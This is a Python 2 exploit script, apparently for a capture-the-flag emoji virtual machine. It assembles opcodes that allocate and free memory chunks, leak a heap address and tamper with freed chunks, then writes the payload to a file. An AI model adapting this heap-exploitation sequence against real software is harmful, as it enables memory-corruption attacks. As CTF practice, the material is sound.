from re import findall


emoji_code = map(unichr,[0, 0x1f233, 0x2795, 0x2796, 0x274c, 0x2753, 0x274e, 0x1f46b, 0x1f480, 0x1f4af, 0x1f680, 0x1f236, 0x1f21a, 0x23ec, 0x1f51d, 0x1f4e4, 0x1f4e5, 0x1f195, 0x1f193, 0x1f4c4, 0x1f4dd, 0x1f521, 0x1f522, 0x1f6d1])
emoji_data = map(unichr,[0x1f600, 0x1f601, 0x1f602, 0x1f923, 0x1f61c, 0x1f604, 0x1f605, 0x1f606, 0x1f609, 0x1f60a, 0x1f60d])
inst = ['inv', 'nop', 'add', 'sub', 'mul', 'mod', 'xor', 'and', 'setg', 'seteq', 'jmp', 'jnz', 'jz', 'push', 'pop', 'getb_memo', 'setb_memo', 'make_memo', 'del_memo', 'write_memo', 'print_memo','print_stack_str', 'print_tos', 'hlt']

code = ''
code += """
push 10
push 10
mul
push 10
mul
push 10
push 10
mul
add
make_memo
push 10
make_memo
push 10
make_memo
push 10
make_memo
push 10
make_memo
push 10
make_memo
add
"""
code += 'pop\n' * (0x28/8)
code += 'print_tos\n' # heap leak
code += """
push 0
write_memo
push 10
push 10
mull
push 6
mull
push 10
push 8 
mull
push 8
add
add
add
push 10
make_memo
push 3
del_memo
push 10
push 10
mul
push 10
mul
make_memo
push 3
write_memo
push 4
print_memo
push 3
write_memo
push 4
write_memo
push 0
del_memo
"""
code += "hlt"
payload = ''
for line in code.strip("\n").split('\n'):
    for i in range(24):
        if line.find(inst[i]) != -1: payload += emoji_code[i]
    if line.find(inst[13]) != -1: payload += emoji_data[int(findall('\d+', line)[0])]


print len(payload.encode('utf-8'))

with open('payload.evm', 'wb') as f:
    f.write(payload.encode('utf-8'))
